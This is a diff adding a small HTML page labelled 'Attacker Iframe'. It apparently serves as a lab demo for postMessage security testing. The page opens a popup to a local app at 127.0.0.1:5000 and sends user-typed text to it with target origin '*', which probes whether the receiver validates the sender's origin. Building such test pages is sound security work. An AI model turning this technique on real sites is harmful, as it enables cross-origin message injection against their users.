@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>postMessage</title>
+</head>
+
+<body>
+    <h3>Attacker Iframe</h3>
+    <p>open null origin popup then send your message</p>
+    <input id="msg" type="text">
+    <button onclick="sendMessage()">send</button>
+</body>
+
+<script>
+    function sendMessage() {
+        const win = window.open("http://127.0.0.1:5000/", "_blank", "width=500,height=300"); // popup
+
+        setTimeout(() => {
+            const msg = document.querySelector('#msg').value;
+            win.postMessage(msg, "*");
+        }, 500);
+    }
+</script>
+
+</html>
